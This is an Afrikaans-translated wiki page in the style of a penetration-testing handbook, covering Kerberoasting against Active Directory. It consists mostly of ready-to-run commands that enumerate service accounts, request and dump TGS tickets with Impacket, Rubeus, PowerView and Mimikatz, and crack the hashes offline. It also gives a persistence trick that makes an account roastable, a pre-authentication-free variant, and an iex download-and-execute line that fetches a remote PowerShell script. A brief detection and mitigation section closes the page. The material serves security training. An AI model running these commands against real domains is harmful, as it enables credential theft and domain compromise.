# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting fokus op die verkryging van **TGS-tickets**, spesifiek dié wat verband hou met dienste wat onder **gebruikersrekeninge** in **Active Directory (AD)** werk, met uitsluiting van **rekeninge van rekenaars**. Die kodering van hierdie tickets gebruik sleutels wat afkomstig is van **gebruikerswagwoorde**, wat die moontlikheid van **offline geloofsbrief kraking** toelaat. Die gebruik van 'n gebruikersrekening as 'n diens word aangedui deur 'n nie-leë **"ServicePrincipalName"** eienskap.

Vir die uitvoering van **Kerberoasting** is 'n domeinrekening wat in staat is om **TGS-tickets** aan te vra, noodsaaklik; egter, hierdie proses vereis nie **spesiale voorregte** nie, wat dit toeganklik maak vir enigiemand met **geldige domein geloofsbriewe**.

### Sleutelpunte:

- **Kerberoasting** teiken **TGS-tickets** vir **gebruikersrekening dienste** binne **AD**.
- Tickets wat met sleutels van **gebruikerswagwoorde** gekodeer is, kan **offline gekraak** word.
- 'n Diens word geïdentifiseer deur 'n **ServicePrincipalName** wat nie null is nie.
- **Geen spesiale voorregte** is nodig nie, net **geldige domein geloofsbriewe**.

### **Aanval**

> [!WARNING]
> **Kerberoasting gereedskap** vra tipies **`RC4-kodering`** aan wanneer die aanval uitgevoer word en TGS-REQ versoeke geïnisieer word. Dit is omdat **RC4 is** [**swakker**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) en makliker is om offline te kraak met gereedskap soos Hashcat as ander kodering algoritmes soos AES-128 en AES-256.\
> RC4 (tipe 23) hashes begin met **`$krb5tgs$23$*`** terwyl AES-256 (tipe 18) begin met **`$krb5tgs$18$*`**.`

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Multi-funksie gereedskap insluitend 'n dump van kerberoastable gebruikers:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

- **Lys Kerberoastable gebruikers**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
- **Tegniek 1: Vra vir TGS en dump dit uit geheue**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
- **Tegniek 2: Outomatiese gereedskap**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
> [!WARNING]
> Wanneer 'n TGS aangevra word, word Windows gebeurtenis `4769 - 'n Kerberos dienskaartjie is aangevra` gegenereer.

### Kraking
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Volharding

As jy **genoeg regte** oor 'n gebruiker het, kan jy dit **kerberoastable maak**:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
U kan nuttige **tools** vir **kerberoast** aanvalle hier vind: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

As u hierdie **fout** van Linux kry: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** is dit as gevolg van u plaaslike tyd, u moet die gasheer met die DC sinkroniseer. Daar is 'n paar opsies:

- `ntpdate <IP of DC>` - Verouderd sedert Ubuntu 16.04
- `rdate -n <IP of DC>`

### Mitigering

Kerberoasting kan met 'n hoë graad van stealthiness uitgevoer word as dit eksploiteerbaar is. Om hierdie aktiwiteit te kan opspoor, moet daar aandag gegee word aan **Security Event ID 4769**, wat aandui dat 'n Kerberos-tiket aangevra is. egter, as gevolg van die hoë frekwensie van hierdie gebeurtenis, moet spesifieke filters toegepas word om verdagte aktiwiteite te isoleer:

- Die diensnaam mag nie **krbtgt** wees nie, aangesien dit 'n normale versoek is.
- Diensname wat eindig op **$** moet uitgesluit word om masjienrekeninge wat vir dienste gebruik word, te vermy.
- Versoeke van masjiene moet gefilter word deur rekeningname wat geformateer is as **machine@domain** uit te sluit.
- Slegs suksesvolle tiketversoeke moet oorweeg word, geïdentifiseer deur 'n mislukkingkode van **'0x0'**.
- **Die belangrikste**, die tiket-enkripsietipe moet **0x17** wees, wat dikwels in Kerberoasting-aanvalle gebruik word.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Om die risiko van Kerberoasting te verminder:

- Verseker dat **Diensrekening Wagwoorde moeilik is om te raai**, met 'n aanbevole lengte van meer as **25 karakters**.
- Gebruik **Geverifieerde Diensrekening**, wat voordele bied soos **outomatiese wagwoordveranderinge** en **gedelegeerde Diens Prinsipaal Naam (SPN) Bestuur**, wat sekuriteit teen sulke aanvalle verbeter.

Deur hierdie maatreëls te implementeer, kan organisasies die risiko wat met Kerberoasting geassosieer word, aansienlik verminder.

## Kerberoast sonder domeinrekening

In **September 2022** is 'n nuwe manier om 'n stelsel te ontgin, aan die lig gebring deur 'n navorser genaamd Charlie Clark, wat deur sy platform [exploit.ph](https://exploit.ph/) gedeel is. Hierdie metode stel in staat om **Dienskaartjies (ST)** te verkry via 'n **KRB_AS_REQ** versoek, wat merkwaardig nie beheer oor enige Active Directory rekening vereis nie. Essensieel, as 'n prinsiep op so 'n manier opgestel is dat dit nie vooraf-verifikasie vereis nie—'n scenario soortgelyk aan wat in die kuberveiligheidsgebied bekend staan as 'n **AS-REP Roasting aanval**—kan hierdie eienskap benut word om die versoekproses te manipuleer. Spesifiek, deur die **sname** attribuut binne die versoek se liggaam te verander, word die stelsel mislei om 'n **ST** uit te reik eerder as die standaard versleutelde Ticket Granting Ticket (TGT).

Die tegniek word volledig in hierdie artikel verduidelik: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

> [!WARNING]
> U moet 'n lys van gebruikers verskaf omdat ons nie 'n geldige rekening het om die LDAP met hierdie tegniek te ondervra nie.

#### Linux

- [impacket/GetUserSPNs.py van PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

- [GhostPack/Rubeus van PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Verwysings

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

{{#include ../../banners/hacktricks-training.md}}
